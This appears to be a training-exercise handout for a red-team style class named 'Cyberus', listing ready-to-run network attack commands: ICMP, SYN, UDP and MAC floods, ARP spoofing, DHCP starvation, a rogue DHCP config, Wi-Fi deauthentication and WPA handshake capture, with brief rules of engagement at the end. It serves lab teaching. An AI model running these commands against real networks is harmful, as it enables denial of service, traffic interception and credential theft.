---
layout: default
title: Cyberus
---
# Cyberus
**Focus**: Network denial and disruption

**Skill**: Disconnect or degrade hostile systems

**Activity**: Identify attackers and remove them from the network

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/cyberus1.png' | relative_url }}" alt="Cyberus Logo" style="max-width: 80%; height: auto;">
</div>

---

# Denial of Service

## ICMP Flood
Install tool (if needed):

<div class="terminal"> sudo apt install -y hping3 </div>

Fast ping flood:

<div class="terminal"> sudo ping -f &lt;target_ip&gt; </div>

Large packet flood:

<div class="terminal"> sudo ping -f -s 65000 &lt;target_ip&gt; </div>

Using hping3:

<div class="terminal"> sudo hping3 --flood --icmp &lt;target_ip&gt; </div>

**Flag Notes**
- `-f` → sends packets as fast as possible
- `-s` → changes packet size
- `--icmp` → chooses ICMP protocol
- `--flood` → removes delay between packets

Try changing:
- packet size
- protocol
- target

---

## SYN Flood
Flood a service port (example: SSH):

<div class="terminal"> sudo hping3 -S --flood -p 22 &lt;target_ip&gt; </div>

More aggressive:

<div class="terminal"> sudo hping3 -S --flood --rand-source -p 22 &lt;target_ip&gt; </div>

**Flag Notes**
- `-S` → sends SYN packets (start of TCP connection)
- `-p` → chooses port
- `--rand-source` → spoofs source IP
- `--flood` → sends continuously

Try changing:
- port number
- adding or removing spoofing

---

## UDP Flood
Flood a UDP port:

<div class="terminal"> sudo hping3 --flood --udp -p 53 &lt;target_ip&gt; </div>

**Flag Notes**
- `--udp` → uses UDP protocol
- `-p` → target port
- `--flood` → continuous send

Try changing:
- ports commonly used by services

---

## MAC Flood (Switch exhaustion)
Install tool:

<div class="terminal"> sudo apt install -y dsniff </div>

Run:

<div class="terminal"> sudo macof -i &lt;interface&gt; </div>

**Flag Notes**
- `-i` → selects network interface
- Tool generates large numbers of fake MAC addresses

Try changing:
- interface

---

# ARP

## ARP Spoofing (Disconnect victim from gateway)
Install tools:

<div class="terminal"> sudo apt install -y dsniff ettercap bettercap </div>

Find gateway:

<div class="terminal"> ip r </div>

Terminal 1:

<div class="terminal"> sudo arpspoof -i &lt;interface&gt; -t &lt;target_ip&gt; &lt;gateway_ip&gt; </div>

Terminal 2:

<div class="terminal"> sudo arpspoof -i &lt;interface&gt; -t &lt;gateway_ip&gt; &lt;target_ip&gt; </div>

**Flag Notes**
- `-i` → interface used
- `-t` → target being poisoned
- Last IP → system you are impersonating

What is happening:
1. Tell victim you are gateway
2. Tell gateway you are victim
3. Traffic flows through attacker

---

## Ettercap ARP Poisoning (GUI)
Start:

<div class="terminal"> sudo ettercap -G </div>

Steps:
1. Select interface
2. Scan for hosts
3. Add target 1 = victim
4. Add target 2 = gateway
5. MitM → ARP poisoning → Start

**What this does**
- Automates the same steps as arpspoof
- Adds packet inspection capability

---

## Gratuitous ARP Flood
Using nemesis:

<div class="terminal"> sudo apt install -y nemesis </div>

<div class="terminal"> sudo nemesis arp -v -d &lt;target_ip&gt; -S &lt;fake_ip&gt; -h &lt;fake_mac&gt; </div>

**Flag Notes**
- `-d` → destination
- `-S` → spoofed sender IP
- `-h` → spoofed MAC
- `-v` → verbose output

Try changing:
- spoofed values

---

# DHCP

## DHCP Starvation (Consume leases)
Install tool:

<div class="terminal"> sudo apt install -y yersinia </div>

Run interactive mode:

<div class="terminal"> sudo yersinia -G </div>

Steps:
1. Select DHCP
2. Launch starvation attack

**What is happening**
- Many fake clients request addresses
- Pool runs out
- Real clients cannot obtain IP

---

## Rogue DHCP Server (dnsmasq)
Install:

<div class="terminal"> sudo apt install -y dnsmasq </div>

Example minimal config:
Edit:

<div class="terminal"> sudo nano /etc/dnsmasq.conf </div>

Add:
<pre>
interface=&lt;interface&gt;
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,&lt;fake_gateway_ip&gt;
dhcp-option=6,&lt;fake_dns_ip&gt;
</pre>

Restart:

<div class="terminal"> sudo systemctl restart dnsmasq </div>

**What the options mean**
- `dhcp-range` → addresses handed out
- `option 3` → gateway given to clients
- `option 6` → DNS server given to clients

---

# Deauthentication

## Monitor wireless interfaces

<div class="terminal"> iwconfig </div>

Enable monitor mode:

<div class="terminal"> sudo airmon-ng start wlan0 </div>

**What this does**
- Puts adapter into packet capture mode

---

## Find targets

<div class="terminal"> sudo airodump-ng wlan0mon </div>

Record:
- BSSID
- Channel
- Client MAC

**What to look for**
- Which AP is active
- Which clients are connected

---

## Deauth a client

<div class="terminal"> sudo aireplay-ng --deauth 20 -a &lt;bssid&gt; -c &lt;client_mac&gt; wlan0mon </div>

Deauth entire AP:

<div class="terminal"> sudo aireplay-ng --deauth 50 -a &lt;bssid&gt; wlan0mon </div>

**Flag Notes**
- `--deauth` → number of packets sent
- `-a` → access point
- `-c` → client

Try changing:
- packet count

---

## Alternative: mdk4
Install:

<div class="terminal"> sudo apt install -y mdk4 </div>

Run:

<div class="terminal"> sudo mdk4 wlan0mon d -B &lt;bssid&gt; </div>

**Flag Notes**
- `d` → deauth mode
- `-B` → target AP

---

# Deauth && Handshake Capture

## Capture handshake
Start capture:

<div class="terminal"> sudo airodump-ng -c &lt;channel&gt; --bssid &lt;bssid&gt; -w capture wlan0mon </div>

Leave running.

**Flag Notes**
- `-c` → channel
- `--bssid` → target AP
- `-w` → output file

---

## Force reconnect to capture handshake

<div class="terminal"> sudo aireplay-ng --deauth 10 -a &lt;bssid&gt; wlan0mon </div>

Watch for:
WPA handshake: &lt;bssid&gt;

---

## Verify capture
Files created:
<pre>
capture.cap
capture.csv
</pre>

Open:

<div class="terminal"> wireshark capture.cap </div>

**What you are verifying**
- Handshake packets present
- Correct network

---

# Quick Recon Commands
Find interface:

<div class="terminal"> ip addr </div>

Find gateway:

<div class="terminal"> ip r </div>

Find active traffic:

<div class="terminal"> sudo iftop -i &lt;interface&gt; </div>

Watch packets:

<div class="terminal"> sudo tcpdump -i &lt;interface&gt; </div>

**What these tell you**
- Interfaces
- Routes
- Traffic patterns
- Packet details

---

# Rules of Engagement
- Only attack assigned targets
- Stop attacks when instructed
- Restore systems after exercise

---
